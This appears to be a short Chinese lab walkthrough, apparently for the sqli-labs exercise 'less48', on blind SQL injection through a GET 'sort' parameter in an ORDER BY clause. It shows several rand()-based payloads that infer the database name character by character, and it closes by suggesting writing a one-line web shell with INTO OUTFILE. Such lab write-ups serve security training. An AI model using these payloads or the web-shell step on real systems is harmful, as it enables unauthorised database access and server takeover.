# GET-Error based Blind -Numeric -ORDER BY CLAUSE  
TAG：GET型注入、可控的Order by、盲注  
## 漏洞利用  
![less48_1](images\less48_1.png)  
此less关闭了报错信息的回显，报错注入无法利用，可以考虑盲注  
![less48_2](images\less48_2.png)  
  
使用rand()函数进行语句的构造  
查询数据库名的语句  
Payload:```?sort=rand(ascii(left(database(),1))=117)```  
![less48_3](images\less48_3.png)  
  

Payload:```?sort=rand(ascii(left(database(),1))=116)```  
![less48_4](images\less48_4.png)  
  
Payload:```?sort=rand(ascii(left(database(),1))=115)```  
![less48_5](images\less48_5.png)  
  
从对数据库名的探测来看，编写脚本探测盲注结果比较困难，改用基于时间的注入还很容易受到网络环境波动的影响  
可以考虑使用into outfile写入一句话小马    